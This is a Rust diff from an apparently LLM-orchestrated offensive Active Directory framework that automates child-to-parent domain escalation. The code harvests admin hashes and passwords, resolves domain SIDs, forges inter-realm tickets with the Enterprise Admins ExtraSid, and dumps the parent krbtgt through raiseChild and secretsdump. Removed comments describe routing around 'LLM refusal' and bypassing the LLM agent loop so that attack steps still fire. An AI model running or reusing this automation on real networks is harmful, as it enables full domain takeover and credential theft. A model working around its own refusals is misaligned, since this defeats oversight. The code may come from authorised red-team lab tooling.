@@ -178,7 +178,9 @@ fn is_inter_forest(source: &str, target: &str) -> bool {
 /// dispatch and accelerate cross-forest fallback paths instead.
 ///
 /// Decision tree:
-/// - Intra-forest (child↔parent or same domain): false (raise_child handles it)
+/// - Intra-forest (child↔parent or same domain): false (forge runs with
+///   `extra_sid=<parent_sid>-519` for child→parent; SID filtering is a
+///   cross-forest concept only)
 /// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=true`: true
 /// - Explicit `TrustInfo` with `is_cross_forest()` and `sid_filtering=false`:
 ///   false (someone disabled SID filtering — try the forge)
@@ -431,168 +433,6 @@ fn resolve_target_fqdn_from_signals(
         .find(|fqdn| label_matches(fqdn))
 }
 
-/// Build the candidate child set for child-to-parent escalation.
-///
-/// The set is the union of:
-/// - lowercased `state.dominated_domains` (krbtgt observed there)
-/// - lowercased domains of every `Administrator` NTLM hash in `state.hashes`
-///   with non-empty hash value AND non-empty domain (so GOAD-style local-SAM
-///   admin reuse can trigger the escalation before krbtgt is dumped)
-///
-/// Returns an empty set when neither source has any entries.
-pub(crate) fn collect_candidate_children(state: &StateInner) -> HashSet<String> {
-    let mut out: HashSet<String> = state
-        .dominated_domains
-        .iter()
-        .map(|d| d.to_lowercase())
-        .collect();
-    for h in state.hashes.iter() {
-        if h.username.eq_ignore_ascii_case("administrator")
-            && h.hash_type.eq_ignore_ascii_case("NTLM")
-            && !h.hash_value.is_empty()
-            && !h.domain.is_empty()
-        {
-            out.insert(h.domain.to_lowercase());
-        }
-    }
-    out
-}
-
-/// A single child→parent work item: `(dedup_key, child_domain, parent_domain, child_dc_ip)`.
-pub(crate) type ChildToParentWorkItem = (String, String, String, String);
-
-/// Build child-to-parent escalation work via the intra-forest FQDN derivation
-/// path (Path A). For each candidate child FQDN with 3+ labels, the parent is
-/// `labels[1..].join(".")`. Skips parents already dominated, children whose DC
-/// IP isn't resolvable, and dedup keys already processed.
-pub(crate) fn build_child_to_parent_work_path_a(
-    state: &StateInner,
-    candidates: &HashSet<String>,
-) -> Vec<ChildToParentWorkItem> {
-    let mut out = Vec::new();
-    for child_domain in candidates.iter() {
-        let cd_lower = child_domain.to_lowercase();
-        let labels: Vec<&str> = cd_lower.split('.').collect();
-        if labels.len() < 3 {
-            continue;
-        }
-        let parent_domain = labels[1..].join(".");
-        if parent_domain.is_empty() || !parent_domain.contains('.') {
-            continue;
-        }
-        if state.dominated_domains.contains(&parent_domain) {
-            continue;
-        }
-        if state.resolve_dc_ip(&parent_domain).is_none() {
-            continue;
-        }
-        let key = format!("raise_child:{cd_lower}");
-        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
-            continue;
-        }
-        let child_dc_ip = match state.domain_controllers.get(&cd_lower) {
-            Some(ip) => ip.clone(),
-            None => continue,
-        };
-        out.push((key, child_domain.clone(), parent_domain, child_dc_ip));
-    }
-    out
-}
-
-/// Build child-to-parent escalation work via the explicit-trust path (Path B).
-/// Walks every `parent_child` trust in `state.trusted_domains`, matches a
-/// candidate child whose lowercased FQDN ends with `.{parent_lc}`, and emits
-/// a work item if the dedup key is not already in `existing_keys` or marked
-/// processed. The `existing_keys` set lets the caller pass the keys already
-/// emitted from Path A so they're not duplicated.
-pub(crate) fn build_child_to_parent_work_path_b(
-    state: &StateInner,
-    candidates: &HashSet<String>,
-    existing_keys: &HashSet<String>,
-) -> Vec<ChildToParentWorkItem> {
-    let mut out = Vec::new();
-    if state.trusted_domains.is_empty() {
-        return out;
-    }
-    for trust in state.trusted_domains.values() {
-        if !trust.is_parent_child() {
-            continue;
-        }
-        let parent_domain = trust.domain.clone();
-        let parent_lc = parent_domain.to_lowercase();
-        if state.dominated_domains.contains(&parent_lc) {
-            continue;
-        }
-        let child_domain = match candidates
-            .iter()
-            .find(|d| d.to_lowercase().ends_with(&format!(".{parent_lc}")))
-        {
-            Some(d) => d.clone(),
-            None => continue,
-        };
-        let key = format!("raise_child:{}", child_domain.to_lowercase());
-        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
-            continue;
-        }
-        if existing_keys.contains(&key) {
-            continue;
-        }
-        let child_dc_ip = match state.domain_controllers.get(&child_domain.to_lowercase()) {
-            Some(ip) => ip.clone(),
-            None => continue,
-        };
-        out.push((key, child_domain, parent_domain, child_dc_ip));
-    }
-    out
-}
-
-/// Find the admin credential to drive a child→parent escalation against
-/// `child_domain`. Returns a `(payload_object, auth_method_tag)` pair where
-/// the JSON object holds either `{username, password}` or
-/// `{username, admin_hash}` per the auth method.
-///
-/// Preference: same-domain admin password credential first, then same-domain
-/// Administrator NTLM hash. Returns `(None, "none")` when neither is present.
-pub(crate) fn find_child_to_parent_admin_cred(
-    state: &StateInner,
-    child_domain: &str,
-) -> (Option<serde_json::Value>, &'static str) {
-    let cd = child_domain.to_lowercase();
-    let pw_cred = state
-        .credentials
-        .iter()
-        .find(|c| c.is_admin && !c.password.is_empty() && c.domain.to_lowercase() == cd)
-        .cloned();
-    if let Some(cred) = pw_cred {
-        return (
-            Some(json!({
-                "username": cred.username,
-                "password": cred.password,
-            })),
-            "password",
-        );
-    }
-    let admin_hash = state
-        .hashes
-        .iter()
-        .find(|h| {
-            h.username.to_lowercase() == "administrator"
-                && h.domain.to_lowercase() == cd
-                && h.hash_type.to_uppercase() == "NTLM"
-        })
-        .cloned();
-    if let Some(h) = admin_hash {
-        return (
-            Some(json!({
-                "username": "Administrator",
-                "admin_hash": h.hash_value,
-            })),
-            "hash",
-        );
-    }
-    (None, "none")
-}
-
 /// Build trust-follow work items directly from `discovered_vulnerabilities`.
 ///
 /// The hash-iteration path inside `auto_trust_follow` silently filters a
@@ -732,11 +572,10 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                 //
                 // Iterate the union of `domain_controllers` keys and
                 // `dominated_domains`. The latter covers the case where a
-                // domain was compromised (e.g. via raise_child to the parent)
-                // but its DC was never explicitly seeded into
-                // `domain_controllers` — without this, parent-DC trust
-                // enumeration would never fire and cross-forest trusts would
-                // remain undiscovered.
+                // domain was compromised via a child→parent forge but its
+                // DC was never explicitly seeded into `domain_controllers`
+                // — without this, parent-DC trust enumeration would never
+                // fire and cross-forest trusts would remain undiscovered.
                 let mut candidate_domains: HashSet<String> = state
                     .domain_controllers
                     .keys()
@@ -976,508 +815,27 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             }
         }
 
-        // Child-to-parent escalation (ExtraSid via raiseChild)
+        // Extract trust keys for every known trust (intra-forest and
+        // cross-forest alike).
         //
-        // Dispatches when a child domain is dominated and its parent FQDN is
-        // known. We derive the parent FQDN by stripping the leftmost label of
-        // the dominated child (always valid intra-forest — child FQDN is
-        // `{label}.{parent_fqdn}` by AD construction), then ALSO union with
-        // any explicit parent_child trusts discovered via LDAP enumeration.
+        // Intra-forest `parent_child` trusts ride the same pipeline as
+        // cross-forest: secretsdump the trust account (e.g. `CHILD$`) on
+        // the forest-root DC, then let the forge work-collection below pick
+        // it up for `forge_inter_realm_and_dump` with
+        // `extra_sid=<parent_sid>-519` for ExtraSid injection. The forest-
+        // root preference at `min_by_key(|(domain, _)| domain.split('.')
+        // .count())` selects the right DC for both directions.
         //
-        // The intra-forest derivation lets us fire immediately on child DA,
-        // bypassing the trust enumeration round-trip — without it we'd block
-        // until `trusted_domains` was populated, which sometimes never
-        // happens (LLM refusal, network, throttle starvation).
-        {
-            let state = dispatcher.state.read().await;
-            let candidate_children = collect_candidate_children(&state);
-            if !candidate_children.is_empty() {
-                let mut child_work = build_child_to_parent_work_path_a(&state, &candidate_children);
-                let existing_keys: HashSet<String> =
-                    child_work.iter().map(|(k, _, _, _)| k.clone()).collect();
-                let path_b =
-                    build_child_to_parent_work_path_b(&state, &candidate_children, &existing_keys);
-                child_work.extend(path_b);
-
-                drop(state);
-
-                for (key, child_domain, parent_domain, dc_ip) in child_work {
-                    let (cred_payload, auth_method) = {
-                        let s = dispatcher.state.read().await;
-                        find_child_to_parent_admin_cred(&s, &child_domain)
-                    };
-
-                    let Some(cred) = cred_payload else {
-                        debug!(
-                            child_domain = %child_domain,
-                            parent_domain = %parent_domain,
-                            "No admin cred/hash for child domain — deferring child-to-parent"
-                        );
-                        continue;
-                    };
-
-                    // Publish vulnerability
-                    let vuln_id = child_to_parent_vuln_id(&child_domain, &parent_domain);
-                    {
-                        let mut details = std::collections::HashMap::new();
-                        details.insert(
-                            "source_domain".into(),
-                            serde_json::Value::String(child_domain.clone()),
-                        );
-                        details.insert(
-                            "target_domain".into(),
-                            serde_json::Value::String(parent_domain.clone()),
-                        );
-                        details.insert(
-                            "note".into(),
-                            serde_json::Value::String(format!(
-                                "Child-to-parent escalation via ExtraSid — {} → {}",
-                                child_domain, parent_domain
-                            )),
-                        );
-                        let vuln = ares_core::models::VulnerabilityInfo {
-                            vuln_id: vuln_id.clone(),
-                            vuln_type: "child_to_parent".to_string(),
-                            target: dc_ip.clone(),
-                            discovered_by: "trust_automation".to_string(),
-                            discovered_at: chrono::Utc::now(),
-                            details,
-                            recommended_agent: String::new(),
-                            priority: 1,
-                        };
-                        let _ = dispatcher
-                            .state
-                            .publish_vulnerability(&dispatcher.queue, vuln)
-                            .await;
-                    }
-
-                    // Dispatch child-to-parent exploit task.  The LLM prompt
-                    // offers raiseChild (automated) and manual ExtraSid golden
-                    // ticket creation as alternatives.
-                    // `dc_ip` is the child DC (for trust key extraction).
-                    // `target` should be the parent DC (for secretsdump after forging ticket).
-                    // Use resolve_dc_ip so the hosts table fills in when
-                    // domain_controllers lacks the parent — falls back to the
-                    // child DC only as a last resort (DCSync can succeed
-                    // against any writable DC in the parent domain).
-                    let parent_dc_ip = {
-                        let s = dispatcher.state.read().await;
-                        s.resolve_dc_ip(&parent_domain)
-                            .unwrap_or_else(|| dc_ip.clone())
-                    };
-                    let mut payload = json!({
-                        "technique": "create_inter_realm_ticket",
-                        "vuln_type": "child_to_parent",
-                        "domain": child_domain,
-                        "trusted_domain": parent_domain,
-                        "target_domain": parent_domain,
-                        "target": &parent_dc_ip,
-                        "dc_ip": dc_ip,
-                        "vuln_id": &vuln_id,
-                    });
-                    // Merge credential fields
-                    if let Some(obj) = cred.as_object() {
-                        for (k, v) in obj {
-                            payload[k] = v.clone();
-                        }
-                    }
-                    // Add domain SIDs and child krbtgt (for ExtraSid via child
-                    // krbtgt — preferred path, no inter-realm trust key needed).
-                    //
-                    // The ExtraSid attack requires the PARENT forest SID (RID 519
-                    // = Enterprise Admins). If we ship the child SID by mistake,
-                    // the parent KDC rejects the ticket with KDC_ERR_PREAUTH_FAILED
-                    // because the embedded SID doesn't resolve to a real EA group.
-                    // So if the parent SID isn't cached, resolve it via lookupsid
-                    // against the parent DC using child admin creds (cross-trust
-                    // SAMR works) BEFORE dispatching the exploit task. Defer the
-                    // dispatch (no dedup mark) when resolution fails so the next
-                    // 30s tick can retry once host scans / DC enumeration progress.
-                    let parent_lower = parent_domain.to_lowercase();
-                    let cd_lower = child_domain.to_lowercase();
-                    let (
-                        mut have_target_sid,
-                        mut have_source_sid,
-                        child_admin_cred,
-                        child_admin_hash,
-                        child_dc_ip,
-                    ) = {
-                        let s = dispatcher.state.read().await;
-                        if let Some(sid) = s.domain_sids.get(&cd_lower) {
-                            payload["source_sid"] = json!(sid);
-                        }
-                        if let Some(sid) = s.domain_sids.get(&parent_lower) {
-                            payload["target_sid"] = json!(sid);
-                        }
-                        if let Some(child_krbtgt) = s.hashes.iter().find(|h| {
-                            h.username.eq_ignore_ascii_case("krbtgt")
-                                && h.domain.to_lowercase() == cd_lower
-                                && h.hash_type.to_uppercase() == "NTLM"
-                        }) {
-                            payload["child_krbtgt_hash"] = json!(child_krbtgt.hash_value);
-                        }
-                        let admin_cred = s
-                            .credentials
-                            .iter()
-                            .find(|c| {
-                                c.is_admin
-                                    && !c.password.is_empty()
-                                    && c.domain.to_lowercase() == cd_lower
-                            })
-                            .cloned();
-                        let admin_hash = s
-                            .hashes
-                            .iter()
-                            .find(|h| {
-                                h.username.to_lowercase() == "administrator"
-                                    && h.domain.to_lowercase() == cd_lower
-                                    && h.hash_type.to_uppercase() == "NTLM"
-                            })
-                            .cloned();
-                        let child_dc = s.resolve_dc_ip(&child_domain);
-                        (
-                            s.domain_sids.contains_key(&parent_lower),
-                            s.domain_sids.contains_key(&cd_lower),
-                            admin_cred,
-                            admin_hash,
-                            child_dc,
-                        )
-                    };
-
-                    if !have_target_sid {
-                        if let Some((sid, admin_name)) = super::golden_ticket::resolve_domain_sid(
-                            &parent_domain,
-                            &parent_dc_ip,
-                            child_admin_cred.as_ref(),
-                            child_admin_hash.as_ref(),
-                        )
-                        .await
-                        {
-                            info!(
-                                parent_domain = %parent_domain,
-                                sid = %sid,
-                                "Resolved parent domain SID via lookupsid for child-to-parent ExtraSid"
-                            );
-                            let op_id = { dispatcher.state.read().await.operation_id.clone() };
-                            let reader = ares_core::state::RedisStateReader::new(op_id);
-                            let mut conn = dispatcher.queue.connection();
-                            let _ = reader.set_domain_sid(&mut conn, &parent_lower, &sid).await;
-                            if let Some(ref name) = admin_name {
-                                let _ = reader.set_admin_name(&mut conn, &parent_lower, name).await;
-                            }
-                            {
-                                let mut state = dispatcher.state.write().await;
-                                state.domain_sids.insert(parent_lower.clone(), sid.clone());
-                                if let Some(ref name) = admin_name {
-                                    state.admin_names.insert(parent_lower.clone(), name.clone());
-                                }
-                            }
-                            payload["target_sid"] = json!(sid);
-                            have_target_sid = true;
-                        } else {
-                            warn!(
-                                child_domain = %child_domain,
-                                parent_domain = %parent_domain,
-                                parent_dc_ip = %parent_dc_ip,
-                                "Could not resolve parent SID — deferring child-to-parent dispatch"
-                            );
-                        }
-                    }
-                    if !have_target_sid {
-                        continue;
-                    }
-
-                    // Resolve child domain SID if not cached (needed for ExtraSid golden ticket)
-                    if !have_source_sid {
-                        if let Some(ref child_dc) = child_dc_ip {
-                            if let Some((sid, admin_name)) =
-                                super::golden_ticket::resolve_domain_sid(
-                                    &child_domain,
-                                    child_dc,
-                                    child_admin_cred.as_ref(),
-                                    child_admin_hash.as_ref(),
-                                )
-                                .await
-                            {
-                                info!(
-                                    child_domain = %child_domain,
-                                    sid = %sid,
-                                    "Resolved child domain SID via lookupsid for child-to-parent ExtraSid"
-                                );
-                                let op_id = { dispatcher.state.read().await.operation_id.clone() };
-                                let reader = ares_core::state::RedisStateReader::new(op_id);
-                                let mut conn = dispatcher.queue.connection();
-                                let _ = reader.set_domain_sid(&mut conn, &cd_lower, &sid).await;
-                                if let Some(ref name) = admin_name {
-                                    let _ = reader.set_admin_name(&mut conn, &cd_lower, name).await;
-                                }
-                                {
-                                    let mut state = dispatcher.state.write().await;
-                                    state.domain_sids.insert(cd_lower.clone(), sid.clone());
-                                    if let Some(ref name) = admin_name {
-                                        state.admin_names.insert(cd_lower.clone(), name.clone());
-                                    }
-                                }
-                                payload["source_sid"] = json!(sid);
-                                have_source_sid = true;
-                            } else {
-                                warn!(
-                                    child_domain = %child_domain,
-                                    child_dc_ip = %child_dc,
-                                    "Could not resolve child SID — deferring child-to-parent dispatch"
-                                );
-                            }
-                        } else {
-                            warn!(
-                                child_domain = %child_domain,
-                                "No child DC IP available — deferring child-to-parent dispatch"
-                            );
-                        }
-                    }
-                    if !have_source_sid {
-                        continue;
-                    }
-
-                    // Use raiseChild.py (impacket's canonical child→parent ExtraSid
-                    // automation) via DIRECT tool dispatch (no LLM in the loop).
-                    // This replaces the previous golden_ticket + secretsdump_kerberos
-                    // combo, which fails because impacket's cross-realm referral is
-                    // broken (fortra/impacket#315): a child-realm ticket presented
-                    // to the parent KDC returns KDC_ERR_WRONG_REALM /
-                    // KDC_ERR_PREAUTH_FAILED. raiseChild forges the inter-realm
-                    // chain internally and dumps parent krbtgt + Administrator in
-                    // one shot.
-                    //
-                    // Direct dispatch_tool bypasses the LLM agent loop entirely —
-                    // the orchestrator owns every input (child admin hash, child
-                    // DC IP, parent DC IP), so there is no value in laundering them
-                    // through an LLM that might typo or omit args.
-                    let admin_hash_value = child_admin_hash.as_ref().map(|h| h.hash_value.clone());
-                    let admin_password = child_admin_cred
-                        .as_ref()
-                        .map(|c| c.password.clone())
-                        .filter(|p| !p.is_empty());
-                    if admin_hash_value.is_none() && admin_password.is_none() {
-                        warn!(
-                            child_domain = %child_domain,
-                            parent_domain = %parent_domain,
-                            "No child Administrator hash or password — deferring child-to-parent (raise_child needs auth)"
-                        );
-                        continue;
-                    }
-
-                    // raiseChild auto-discovers parent forest root via the
-                    // child DC's trustedDomain LDAP objects and resolves DC IPs
-                    // via DNS — script-level flags for IP/domain are unsupported
-                    // (argparse exit 2). However, on workers without forest DNS,
-                    // the bare domain FQDN (`child.contoso.local`) won't
-                    // resolve — so pass the IPs so the tool wrapper can
-                    // pre-seed `/etc/hosts` before invoking impacket.
-                    let mut raise_args = json!({
-                        "child_domain": child_domain.clone(),
-                        "username": "Administrator",
-                    });
-                    if let Some(h) = admin_hash_value {
-                        raise_args["hash"] = json!(h);
-                    } else if let Some(p) = admin_password {
-                        raise_args["password"] = json!(p);
-                    }
-                    if let Some(ref ip) = child_dc_ip {
-                        raise_args["child_dc_ip"] = json!(ip);
-                    }
-                    raise_args["parent_domain"] = json!(parent_domain.clone());
-                    if !parent_dc_ip.is_empty() {
-                        raise_args["parent_dc_ip"] = json!(parent_dc_ip.clone());
-                    }
-
-                    let call = ToolCall {
-                        id: format!("raise_child_{}", uuid::Uuid::new_v4().simple()),
-                        name: "raise_child".to_string(),
-                        arguments: raise_args,
-                    };
-                    let task_id = format!(
-                        "trust_raise_child_{}",
-                        &uuid::Uuid::new_v4().simple().to_string()[..12]
-                    );
-
-                    // Mark dedup BEFORE spawning so the next 30s tick doesn't
-                    // re-dispatch the same trust while raiseChild is running.
-                    dispatcher
-                        .state
-                        .write()
-                        .await
-                        .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
-                        .await;
-
-                    info!(
-                        task_id = %task_id,
-                        child_domain = %child_domain,
-                        parent_domain = %parent_domain,
-                        auth = auth_method,
-                        "Dispatching raise_child (direct tool, no LLM)"
-                    );
-
-                    // Spawn so the trust loop continues processing other items
-                    // while raiseChild runs (typically 30–120s). mark_exploited
-                    // is gated on observed parent krbtgt — no premature marking.
-                    let dispatcher_bg = dispatcher.clone();
-                    let parent_domain_bg = parent_domain.clone();
-                    let child_domain_bg = child_domain.clone();
-                    let vuln_id_bg = vuln_id.clone();
-                    let key_bg = key.clone();
-                    tokio::spawn(async move {
-                        let result = dispatcher_bg
-                            .llm_runner
-                            .tool_dispatcher()
-                            .dispatch_tool("privesc", &task_id, &call)
-                            .await;
-                        let clear_dedup = || async {
-                            dispatcher_bg
-                                .state
-                                .write()
-                                .await
-                                .unmark_processed(DEDUP_TRUST_FOLLOW, &key_bg);
-                            let _ = dispatcher_bg
-                                .state
-                                .unpersist_dedup(&dispatcher_bg.queue, DEDUP_TRUST_FOLLOW, &key_bg)
-                                .await;
-                        };
-                        match result {
-                            Ok(exec_result) => {
-                                if let Some(err) = exec_result.error.as_ref() {
-                                    let tail: String = exec_result
-                                        .output
-                                        .chars()
-                                        .rev()
-                                        .take(2000)
-                                        .collect::<String>()
-                                        .chars()
-                                        .rev()
-                                        .collect();
-                                    warn!(
-                                        err = %err,
-                                        child_domain = %child_domain_bg,
-                                        parent_domain = %parent_domain_bg,
-                                        output_tail = %tail,
-                                        "raise_child returned error — clearing dedup for retry"
-                                    );
-                                    clear_dedup().await;
-                                    return;
-                                }
-                                // Verify parent compromise — only mark exploited
-                                // when we actually observe parent krbtgt.
-                                //
-                                // Inspect exec_result.discoveries directly:
-                                // dispatch_tool returns BEFORE push_realtime_discoveries
-                                // finishes pumping hashes into state.hashes, so reading
-                                // state here is too early and produces a false negative.
-                                let parent_lower = parent_domain_bg.to_lowercase();
-                                let has_parent_krbtgt = exec_result
-                                    .discoveries
-                                    .as_ref()
-                                    .and_then(|d| d.get("hashes"))
-                                    .and_then(|h| h.as_array())
-                                    .map(|hashes| {
-                                        hashes.iter().any(|h| {
-                                            let user = h
-                                                .get("username")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            let dom = h
-                                                .get("domain")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            let htype = h
-                                                .get("hash_type")
-                                                .and_then(|v| v.as_str())
-                                                .unwrap_or("");
-                                            user.eq_ignore_ascii_case("krbtgt")
-                                                && dom.to_lowercase() == parent_lower
-                                                && htype.eq_ignore_ascii_case("ntlm")
-                                        })
-                                    })
-                                    .unwrap_or(false);
-                                let tail_for_log: String = exec_result
-                                    .output
-                                    .chars()
-                                    .rev()
-                                    .take(2000)
-                                    .collect::<String>()
-                                    .chars()
-                                    .rev()
-                                    .collect();
-                                if has_parent_krbtgt {
-                                    info!(
-                                        parent_domain = %parent_domain_bg,
-                                        "raise_child compromised parent — marking exploited"
-                                    );
-                                    let _ = dispatcher_bg
-                                        .state
-                                        .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
-                                        .await;
-                                    let techniques =
-                                        vec!["T1134.005".to_string(), "T1003.006".to_string()];
-                                    let event_id = format!(
-                                        "evt-raise-child-{}",
-                                        &uuid::Uuid::new_v4().simple().to_string()[..8]
-                                    );
-                                    let event = serde_json::json!({
-                                        "id": event_id,
-                                        "timestamp": chrono::Utc::now().to_rfc3339(),
-                                        "source": "trust_automation",
-                                        "description": format!(
-                                            "Child-to-parent ExtraSid escalation: {} \u{2192} {} via raiseChild",
-                                            child_domain_bg, parent_domain_bg
-                                        ),
-                                        "mitre_techniques": techniques,
-                                    });
-                                    let _ = dispatcher_bg
-                                        .state
-                                        .persist_timeline_event(
-                                            &dispatcher_bg.queue,
-                                            &event,
-                                            &techniques,
-                                        )
-                                        .await;
-                                } else {
-                                    warn!(
-                                        parent_domain = %parent_domain_bg,
-                                        output_tail = %tail_for_log,
-                                        "raise_child completed but no parent krbtgt observed — NOT marking exploited"
-                                    );
-                                }
-                            }
-                            Err(e) => {
-                                warn!(
-                                    err = %e,
-                                    child_domain = %child_domain_bg,
-                                    parent_domain = %parent_domain_bg,
-                                    "raise_child dispatch errored — clearing dedup for retry"
-                                );
-                                clear_dedup().await;
-                            }
-                        }
-                    });
-                }
-            }
-        }
-
-        // Extract trust keys for known cross-forest trusts
+        // The legacy `raise_child` (impacket raiseChild.py) child→parent
+        // path was retired here: impacket's cross-realm referral is broken
+        // (fortra/impacket#315) and the wrapper trips KDC_ERR_TGT_REVOKED
+        // on Win2016+ parent KDCs with no recovery.
         {
             let state = dispatcher.state.read().await;
             if state.has_domain_admin && !state.trusted_domains.is_empty() {
-                // Collect trust work with per-trust source domain:
-                // use a dominated domain that has a known DC (excluding the trust target).
-                // IMPORTANT: prefer the forest root DC — trust accounts (e.g. FOREIGNDOMAIN$)
-                // live on the forest root DC, not child domain DCs. A secretsdump with
-                // -just-dc-user FOREIGNDOMAIN$ against a child DC returns nothing.
                 let extract_work: Vec<(String, String, String, String, String)> = state
                     .trusted_domains
                     .values()
-                    .filter(|trust| trust.is_cross_forest())
                     .filter_map(|trust| {
                         let key = format!("trust_extract:{}", trust.domain.to_lowercase());
                         if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
@@ -2255,6 +1613,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             let trust_key_bg = item.hash.hash_value.clone();
             let aes_key_bg = resolved_aes_key.clone();
             let source_domain_sid_bg = source_domain_sid.clone();
+            let is_child_to_parent_bg = is_child_to_parent;
             tokio::spawn(async move {
                 let result = dispatcher_bg
                     .llm_runner
@@ -2326,25 +1685,38 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             info!(
                                 source_domain = %source_domain_bg,
                                 target_domain = %target_domain_bg,
-                                "Cross-forest forge compromised target — marking exploited"
+                                child_to_parent = is_child_to_parent_bg,
+                                "Trust forge compromised target — marking exploited"
                             );
                             let _ = dispatcher_bg
                                 .state
                                 .mark_exploited(&dispatcher_bg.queue, &vuln_id_bg)
                                 .await;
-                            let techniques = vec!["T1134.005".to_string(), "T1550.003".to_string()];
+                            let techniques = if is_child_to_parent_bg {
+                                vec!["T1134.005".to_string(), "T1003.006".to_string()]
+                            } else {
+                                vec!["T1134.005".to_string(), "T1550.003".to_string()]
+                            };
                             let event_id = format!(
                                 "evt-trust-{}",
                                 &uuid::Uuid::new_v4().simple().to_string()[..8]
                             );
+                            let description = if is_child_to_parent_bg {
+                                format!(
+                                    "Child-to-parent ExtraSid escalation: {} \u{2192} {} via {} trust key",
+                                    source_domain_bg, target_domain_bg, trust_account_bg
+                                )
+                            } else {
+                                format!(
+                                    "Forest trust escalation: {} \u{2192} {} via trust key {}",
+                                    source_domain_bg, target_domain_bg, trust_account_bg
+                                )
+                            };
                             let event = serde_json::json!({
                                 "id": event_id,
                                 "timestamp": chrono::Utc::now().to_rfc3339(),
                                 "source": "trust_automation",
-                                "description": format!(
-                                    "Forest trust escalation: {} \u{2192} {} via trust key {}",
-                                    source_domain_bg, target_domain_bg, trust_account_bg
-                                ),
+                                "description": description,
                                 "mitre_techniques": techniques,
                             });
                             let _ = dispatcher_bg
@@ -3502,322 +2874,6 @@ mod tests {
         assert_eq!(vuln_id_a, vuln_id_b);
     }
 
-    // ── helpers for new child-to-parent work tests ───────────────────────
-
-    fn make_admin_hash(domain: &str, value: &str) -> ares_core::models::Hash {
-        ares_core::models::Hash {
-            id: format!("h-admin-{domain}"),
-            username: "Administrator".into(),
-            hash_value: value.into(),
-            hash_type: "NTLM".into(),
-            domain: domain.into(),
-            cracked_password: None,
-            source: String::new(),
-            discovered_at: None,
-            parent_id: None,
-            attack_step: 0,
-            aes_key: None,
-            is_previous: false,
-            source_host: None,
-            is_trust_key: false,
-            trust_pair_label: None,
-        }
-    }
-
-    fn make_admin_cred(password: &str, domain: &str) -> ares_core::models::Credential {
-        ares_core::models::Credential {
-            id: format!("c-admin-{domain}"),
-            username: "Administrator".into(),
-            password: password.into(),
-            domain: domain.into(),
-            source: String::new(),
-            discovered_at: None,
-            is_admin: true,
-            parent_id: None,
-            attack_step: 0,
-        }
-    }
-
-    // --- collect_candidate_children ------------------------------------
-
-    #[test]
-    fn collect_candidates_includes_dominated_domains() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("child.contoso.local".into());
-        s.dominated_domains.insert("Other.Domain".into());
-        let v = collect_candidate_children(&s);
-        assert!(v.contains("child.contoso.local"));
-        // Returned set must be lowercased.
-        assert!(v.contains("other.domain"));
-    }
-
-    #[test]
-    fn collect_candidates_includes_admin_hash_domains() {
-        let mut s = StateInner::new("op".into());
-        s.hashes.push(make_admin_hash(
-            "contoso.local",
-            "deadbeef".repeat(4).as_str(),
-        ));
-        let v = collect_candidate_children(&s);
-        assert!(v.contains("contoso.local"));
-    }
-
-    #[test]
-    fn collect_candidates_skips_empty_hash_value() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.hash_value = String::new();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_skips_empty_domain() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("", "deadbeef");
-        h.domain = String::new();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_skips_non_admin_users() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.username = "alice".into();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_skips_non_ntlm_hashes() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.hash_type = "AES256".into();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_returns_empty_when_no_signals() {
-        let s = StateInner::new("op".into());
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    // --- build_child_to_parent_work_path_a ----------------------------
-
-    #[test]
-    fn path_a_emits_work_for_valid_child() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let work = build_child_to_parent_work_path_a(&s, &candidates);
-        assert_eq!(work.len(), 1);
-        assert_eq!(work[0].0, "raise_child:child.contoso.local");
-        assert_eq!(work[0].1, "child.contoso.local");
-        assert_eq!(work[0].2, "contoso.local");
-        assert_eq!(work[0].3, "192.168.58.11");
-    }
-
-    #[test]
-    fn path_a_skips_short_fqdn() {
-        let s = StateInner::new("op".into());
-        // Only 2 labels — no parent extractable.
-        let candidates: HashSet<String> = ["contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_already_dominated_parent() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.dominated_domains.insert("contoso.local".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_parent_with_no_dc_ip() {
